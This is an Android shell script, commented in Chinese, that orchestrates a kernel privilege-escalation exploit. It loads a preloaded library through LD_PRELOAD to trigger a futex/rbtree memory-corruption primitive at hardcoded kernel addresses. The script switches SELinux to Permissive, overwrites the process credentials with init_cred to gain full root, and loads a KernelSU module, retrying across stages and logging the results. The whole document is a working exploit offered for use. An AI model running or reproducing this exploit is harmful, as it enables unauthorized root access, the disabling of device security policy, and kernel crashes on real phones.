#!/system/bin/sh
# mt49: 双写两阶段 — 一进程一写 (crash#2 教训)
#   阶段R: fork 子进程 + 写 real_cred=init_cred  (独立进程, RETRY=1)
#   阶段C: 外部模式写 cred=init_cred            (独立进程, RETRY=1, PSELECT_TASK)
#   两写落地 → real==cred==init_cred → commit_creds 的 BUG_ON cmp 相等 →
#   子进程 gate(满帽 AND euid==0) 触发 → setresgid/setresuid 安全 → 全套 root
# 同进程多 attempt 已判死: v37_* 静态 futex 词不清 → 第二次触发 rb_insert 在中毒
# 树上 rebalance → 旋转写坏 task+0x770..0x788 → panic (见 MT49_ADJUDICATION)
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt49.so
DST=/data/local/tmp/preload.so
KO=/data/local/tmp/kernelsu.ko
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt49_root.txt
RUNLOG=/data/local/tmp/mt49_run.out
STATUS=/data/local/tmp/mt49_child_status.txt
rm -f $DST; cp $SRC $DST; sync
BID0=$(cat /proc/sys/kernel/random/boot_id)
rm -f /data/local/tmp/root_alive.txt /data/local/tmp/ksu_done.txt $STATUS
echo "boot_before=$BID0" > $LOG
am kill-all 2>&1 | tail -1 >> $LOG

getfield() { awk -F= -v k="$1" '$1==k{print $2}' $STATUS 2>/dev/null; }

# ---------- R0: 判活 (3 轮) ----------
R0OK=0
for R0N in 1 2 3; do
  rm -f $RUNLOG
  timeout 120 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_RETRY=1 \
    PSELECT_TREE_PC=ffffff8002a60bb0 \
    PSELECT_TREE_LEFT=0 \
    LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
  BID=$(cat /proc/sys/kernel/random/boot_id)
  echo "R0 round=$R0N rc=$? boot_id=$BID" >> $LOG
  if [ "$BID" != "$BID0" ]; then R0OK=1; echo "R0: ALIVE (round=$R0N)" >> $LOG; break; fi
  sleep 3
done
[ $R0OK -eq 1 ] || { echo "!! R0 3轮全灭 — 原语未激活, 换 boot" >> $LOG; exit 1; }

# ---------- ENF: 翻 Permissive (best-effort, 失败不阻断) ----------
for E in 1 2 3; do
  EF=$(getenforce 2>/dev/null)
  case "$EF" in *ermissive*) break;; esac
  rm -f $RUNLOG
  timeout 120 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_RETRY=1 \
    PSELECT_TREE_PC=ffffff8002a41b90 \
    PSELECT_TREE_LEFT=0 \
    LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
  echo "ENF round=$E rc=$? enforce=$(getenforce)" >> $LOG
  sleep 3
done
echo "ENF final=$(getenforce)" >> $LOG

KOARG=""
[ -f $KO ] && KOARG="PSELECT_KO=$KO" && echo "ko found: $KO" >> $LOG

# ---------- STAGE-R: real_cred → init_cred ----------
# 第 1 轮 fork 子进程(存活 8min, 持续写状态文件); 未落地则外部模式补打(幂等)
for RA in 1 2 3; do
  rm -f $RUNLOG
  TASKARG=""
  [ $RA -gt 1 ] && TASKARG="PSELECT_TASK=$(getfield task)"
  timeout 120 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_CRED=1 \
    PSELECT_PERF_CRED=1 \
    PSELECT_RETRY=1 \
    PSELECT_PTR_MODE=1 \
    PSELECT_PTR_STAGE=R \
    PSELECT_PTR_STRICT=1 \
    $TASKARG \
    $KOARG \
    LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
  echo "STAGE-R round=$RA rc=$? $TASKARG" >> $LOG
  grep -a 'mt48:\|mt49:\|mt28m:\|mt33:\|futex trigger\|SLIDE page' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  for PS in /sys/fs/pstore/console-ramoops-0; do
    [ -f $PS ] && { echo "--- pstore tail ---" >> $LOG; tail -40 $PS >> $LOG 2>/dev/null; }
  done
  sleep 2
  CAPE=$(getfield CapEff)
  echo "STAGE-R round=$RA CapEff=$CAPE" >> $LOG
  case "$CAPE" in
    *1fffff*) echo "★★★ STAGE-R LANDED (real_cred=init_cred) round=$RA ★★★" >> $LOG; break;;
  esac
  # 状态文件没有 task 地址 → 子进程没起来, 重跑 fork 模式
  [ -z "$(getfield task)" ] && [ $RA -lt 3 ] && continue
done
CAPE=$(getfield CapEff)
case "$CAPE" in
  *1fffff*) : ;;
  *) echo "!! STAGE-R 3轮未落地 — 换 boot 重跑全套" >> $LOG; exit 1 ;;
esac

# ---------- STAGE-C: cred → init_cred (外部模式, 同一子进程) ----------
TASK=$(getfield task)
echo "STAGE-C task=$TASK" >> $LOG
for CA in 1 2 3; do
  rm -f $RUNLOG
  timeout 120 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_CRED=1 \
    PSELECT_RETRY=1 \
    PSELECT_PTR_MODE=1 \
    PSELECT_PTR_STAGE=C \
    PSELECT_PTR_STRICT=1 \
    PSELECT_TASK=$TASK \
    $KOARG \
    LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
  echo "STAGE-C round=$CA rc=$?" >> $LOG
  grep -a 'mt48:\|mt49:\|mt28m:\|futex trigger\|SLIDE page' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  for PS in /sys/fs/pstore/console-ramoops-0; do
    [ -f $PS ] && { echo "--- pstore tail ---" >> $LOG; tail -40 $PS >> $LOG 2>/dev/null; }
  done
  [ -f /data/local/tmp/root_alive.txt ] && echo "★★★ ROOT-ALIVE round=$CA: $(cat /data/local/tmp/root_alive.txt) ★★★" >> $LOG
  [ -f /data/local/tmp/ksu_done.txt ] && echo "★★★★ KSU-LOADED round=$CA ★★★★" >> $LOG
  [ -f /data/local/tmp/ksu_done.txt ] && break
  [ -f /data/local/tmp/root_alive.txt ] && break
  sleep 2
  EUID_V=$(getfield euid)
  echo "STAGE-C round=$CA euid=$EUID_V status=$(cat $STATUS 2>/dev/null)" >> $LOG
done

sleep 5
echo "=== final uid=$(id -u) enforce=$(getenforce) root_alive=$([ -f /data/local/tmp/root_alive.txt ] && echo YES || echo no) ksu=$([ -f /data/local/tmp/ksu_done.txt ] && echo YES || echo no) ===" >> $LOG
echo "=== DONE $(date +%H:%M:%S) ===" >> $LOG

# 判读:
#  STAGE-R CapEff 满帽 → R 落地; STAGE-C 后 root_alive.txt → uid 全套 root;
#  ksu_done.txt → 模块加载成功, 项目毕业
#  任一阶段 3 轮全灭 → 换 boot 重跑 (本 boot 原语疲劳)
